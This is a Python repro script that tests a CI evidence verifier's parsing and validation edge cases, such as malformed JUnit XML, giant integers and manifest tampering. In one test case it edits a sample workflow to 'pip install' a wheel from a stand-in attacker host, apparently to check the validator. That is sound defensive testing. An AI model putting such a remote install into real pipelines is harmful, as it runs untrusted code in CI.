"""T013 repro part 4: CDATA space-form, self-closing failure, R6a redo, giant ints,
explicit_sha capture, dirty-before, result overflow, bundle gaps, workflow validator."""
import hashlib, json, shutil, subprocess, sys
from pathlib import Path
ROOT = Path("/home/hatch/workspace/p027-benchreceipt")
SRC = ROOT / "02_source"
sys.path.insert(0, str(SRC / "src"))
FIX = SRC / "fixtures" / "s0" / "n02-two-job-pr-head"
WORK = Path("/tmp/t013-repro/work4")
shutil.rmtree(WORK, ignore_errors=True); WORK.mkdir(parents=True)
from benchreceipt.policy import load_policy, validate_policy  # noqa: E402
from benchreceipt.verify import evaluate  # noqa: E402
from benchreceipt.reports.junit import parse_junit, JUnitError  # noqa: E402
from benchreceipt.reports.lcov import parse_lcov  # noqa: E402

def junit_xml(n_tests=10, n_fail=0, n_err=0, n_skip=0, tests_attr=None, extra=""):
    cases = []
    for i in range(n_tests):
        inner = ""
        if i < n_fail: inner = '<failure message="x">t</failure>'
        elif i < n_fail + n_err: inner = '<error message="x">t</error>'
        elif i < n_fail + n_err + n_skip: inner = "<skipped/>"
        cases.append(f'<testcase classname="t" name="test_{i}">{inner}</testcase>')
    ta = tests_attr if tests_attr is not None else n_tests
    return (f'<?xml version="1.0"?>\n<testsuite name="s" tests="{ta}" failures="{n_fail}" '
            f'errors="{n_err}" skipped="{n_skip}">{extra}{"".join(cases)}</testsuite>\n').encode()

def base_evidence(dst, jobs=("unit-linux-py312",)):
    shutil.copytree(FIX / "evidence", dst)
    for d in list(dst.iterdir()):
        if d.name not in jobs: shutil.rmtree(d)
    policy = load_policy(FIX / "policy.toml")
    policy["required_jobs"] = list(jobs)
    sha = json.loads((FIX / "expected.json").read_text())["expected_source_sha"]
    return policy, sha

def write_policy_file(dst, policy):
    Path(dst).mkdir(parents=True, exist_ok=True)
    lines = ["schema_version = 1", f'source_mode = "{policy["source_mode"]}"',
             f'expected_workflow = "{policy["expected_workflow"]}"',
             "required_jobs = [", ", ".join(f'"{j}"' for j in policy["required_jobs"]), "]",
             f'min_tests = {policy["min_tests"]}',
             f'require_clean_source_after = {str(policy["require_clean_source_after"]).lower()}',
             f'same_tree_across_jobs = {str(policy["same_tree_across_jobs"]).lower()}',
             f'same_run_id = {str(policy["same_run_id"]).lower()}',
             f'same_run_attempt = {str(policy["same_run_attempt"]).lower()}',
             "", "[reports]", f'junit = "{policy["reports"]["junit"]}"',
             f'lcov = "{policy["reports"]["lcov"]}"', "", "[security]",
             "store_stdout = false", "store_stderr = false", "store_full_environment = false"]
    pp = Path(dst) / "policy.toml"; pp.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return pp

def run_oracle(policy_path, sha, evidence):
    p = subprocess.run(["node", str(SRC / "oracle" / "verify.mjs"), "--policy", str(policy_path),
                        "--expected-source-sha", sha, "--evidence", str(evidence)],
                       capture_output=True, text=True, timeout=60)
    try: res = json.loads(p.stdout)
    except Exception: res = {"_stdout": p.stdout[:200], "_stderr": p.stderr[:200]}
    return p.returncode, res

def both(name, evdir, policy, sha):
    py = evaluate(policy, sha, evdir)
    pp = write_policy_file(evdir.parent / (evdir.name + "-pol"), policy)
    rc, ora = run_oracle(pp, sha, evdir)
    print(f"{name}: PY {py['status']} {sorted(py['reason_codes'])} jobs={py['jobs_verified']} | "
          f"ORA exit={rc} {ora.get('status')} {sorted(ora.get('reason_codes', []))} jobs={ora.get('jobs_verified')}")
    return py, ora

def set_junit(evdir, job, data, summary=None):
    jd = Path(evdir) / job
    (jd / "artifacts" / "junit.xml").write_bytes(data)
    rec = json.loads((jd / "receipt.json").read_text())
    rec["reports"][0]["size_bytes"] = len(data)
    rec["reports"][0]["sha256"] = hashlib.sha256(data).hexdigest()
    if summary is not None: rec["junit"] = summary
    (jd / "receipt.json").write_text(json.dumps(rec, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    return rec

print("== R4a3 CDATA with '<failure >' (space form) ==")
ev = WORK / "r4a3"; pol, sha = base_evidence(ev)
cases = "".join(f'<testcase classname="t" name="test_{i}"></testcase>' for i in range(9))
cases += '<testcase classname="t" name="test_9"><![CDATA[<failure >oops</failure>]]></testcase>'
data = (b'<?xml version="1.0"?>\n<testsuite name="s" tests="10" failures="0" errors="0" skipped="0">'
        + cases.encode() + b'</testsuite>\n')
set_junit(ev, "unit-linux-py312", data)
both("R4a3-cdata-failure-space", ev, pol, sha)

print("== R4g self-closing <failure/> counted by PY, missed by Oracle regex ==")
ev = WORK / "r4g"; pol, sha = base_evidence(ev)
cases = "".join(f'<testcase classname="t" name="test_{i}"></testcase>' for i in range(9))
cases += '<testcase classname="t" name="test_9"><failure/></testcase>'
data = (b'<?xml version="1.0"?>\n<testsuite name="s" tests="10" failures="1" errors="0" skipped="0">'
        + cases.encode() + b'</testsuite>\n')
set_junit(ev, "unit-linux-py312", data, summary={"tests": 10, "failures": 1, "errors": 0, "skipped": 0})
both("R4g-selfclosing-failure", ev, pol, sha)
print("R4g direct: parse_junit counts failures =", parse_junit(data)["failures"])

print("== R6a-redo dup min_tests with single-job policy file ==")
ev = WORK / "r6a"; pol, sha = base_evidence(ev)
pp = write_policy_file(WORK / "r6a-pol", pol)
txt = pp.read_text().replace("min_tests = 1", "min_tests = 5\nmin_tests = 0", 1)
pp.write_text(txt, encoding="utf-8")
from benchreceipt.policy import load_policy as lp
try:
    lp(pp); print("R6a-redo dup min_tests: PY ACCEPTS (unexpected)")
except Exception as e:
    print("R6a-redo dup min_tests: PY rejects:", type(e).__name__)
rc, ora = run_oracle(pp, sha, ev)
print(f"R6a-redo dup min_tests: ORA exit={rc} {ora.get('status')} {ora.get('reason_codes')} jobs={ora.get('jobs_verified')}")

print("== R9 giant-int JUnit count attribute ==")
huge = b'<?xml version="1.0"?>\n<testsuite name="s" tests="' + b"9" * 5000 + b'" failures="0" errors="0" skipped="0"><testcase classname="t" name="t0"/></testsuite>\n'
try:
    print("R9 parse_junit huge attr ->", parse_junit(huge))
except JUnitError as e:
    print("R9 parse_junit huge attr -> JUnitError (clean):", str(e)[:80])
except ValueError as e:
    print("R9 parse_junit huge attr -> ValueError LEAKS (not JUnitError):", type(e).__name__, str(e)[:80])
ev = WORK / "r9"; pol, sha = base_evidence(ev)
set_junit(ev, "unit-linux-py312", huge)
py = evaluate(pol, sha, ev)
print(f"R9 verify huge attr -> {py['status']} {sorted(py['reason_codes'])}")

print("== R10 giant-int manifest size ==")
from benchreceipt.bundle import verify_bundle, build_bundle, BundleError  # noqa: E402
ev = WORK / "r10-ev"; pol, sha = base_evidence(ev)
out = WORK / "r10-bundle"
build_bundle(ev, out)
man = out / "SHA256SUMS.txt"
lines = man.read_text().splitlines()
parts = lines[0].split(" ", 2)
lines[0] = f"{parts[0]} {'9' * 5000} {parts[2]}"
man.write_text("\n".join(lines) + "\n", encoding="utf-8")
try:
    res = verify_bundle(out)
    print(f"R10 giant manifest size -> ok={res.ok} problems={[p['code'] for p in res.problems][:3]}")
except ValueError as e:
    print("R10 giant manifest size -> ValueError LEAKS out of verify_bundle:", type(e).__name__, str(e)[:100])
except Exception as e:
    print("R10 giant manifest size ->", type(e).__name__, str(e)[:100])

print("== R21 nested testsuite count attr unchecked (production) ==")
nested = (b'<?xml version="1.0"?>\n<testsuite name="outer" tests="1" failures="0" errors="0" skipped="0">'
          b'<testsuite name="inner" tests="99" failures="99" errors="0" skipped="0">'
          b'<testcase classname="t" name="t0"/></testsuite></testsuite>\n')
try:
    print("R21 nested suite attrs tests=99/failures=99, 1 testcase ->", parse_junit(nested))
except JUnitError as e:
    print("R21 nested -> JUnitError:", str(e)[:100])

print("== R23 P2-03 manifest reorder alone still verifies ==")
ev = WORK / "r23-ev"; pol, sha = base_evidence(ev)
out = WORK / "r23-bundle"; build_bundle(ev, out)
man = out / "SHA256SUMS.txt"
lines = man.read_text().splitlines()
man.write_text("\n".join(reversed(lines)) + "\n", encoding="utf-8")
res = verify_bundle(out)
print(f"R23 reordered manifest alone -> ok={res.ok} (P2-03 as documented)")

print("== R28 report path with '.' segment ==")
ev = WORK / "r28"; pol, sha = base_evidence(ev)
jd = ev / "unit-linux-py312"
rec = json.loads((jd / "receipt.json").read_text())
rec["reports"][0]["path"] = "artifacts/./junit.xml"
(jd / "receipt.json").write_text(json.dumps(rec, indent=2, sort_keys=True) + "\n", encoding="utf-8")
from benchreceipt.schema import validate_against_schema as vas
try:
    vas(rec, "run"); print("R28 schema: path 'artifacts/./junit.xml' ACCEPTED by run.v1 pattern")
except Exception as e:
    print("R28 schema: rejects:", str(e)[:120])
py = evaluate(pol, sha, ev)
print(f"R28 verify.py with './' path -> {py['status']} {sorted(py['reason_codes'])}")
res = verify_bundle(build_bundle(ev, WORK / "r28-bundle") if False else WORK / "r28-bundle")
print("R28 (bundle check skipped; see bundle _check_receipt_reports below)")
from benchreceipt.bundle import _check_receipt_reports, BundleProblem  # noqa: E402
probs = []
_check_receipt_reports(WORK / "r28-bundle", jd, "unit-linux-py312/receipt.json", probs)
print("R28 bundle _check_receipt_reports on './' path ->", [(p.code, p.path) for p in probs])

print("== R26 workflow validator accepts remote .whl ==")
sys.path.insert(0, str(SRC / "scripts"))
from validate_workflow_example import validate_workflow_text  # noqa: E402
ci = (SRC / "examples" / "github-actions" / "ci.yml").read_text()
evil = ci.replace("python -m pip install --no-build-isolation ./vendor/benchreceipt",
                  "python -m pip install https://evil.example/x.whl", 1)
errs = validate_workflow_text(evil, ["unit-linux-py312", "unit-linux-py313", "unit-windows-py312", "unit-windows-py313"])
print("R26 remote https .whl pip install -> errors:", errs if errs else "NONE (validator passes a remote wheel)")

print("== R22 P2-04 bare CR in LCOV SF preserved (as documented) ==")
try:
    out = parse_lcov(b"TN:\nSF:src/foo\rbar.py\nDA:1,1\nLF:1\nLH:1\nend_of_record\n")
    print("R22 bare CR in SF -> parsed, source_file =", repr(out["records"][0]["source_file"]), "(P2-04 as documented)")
except Exception as e:
    print("R22 bare CR in SF ->", type(e).__name__, str(e)[:100])
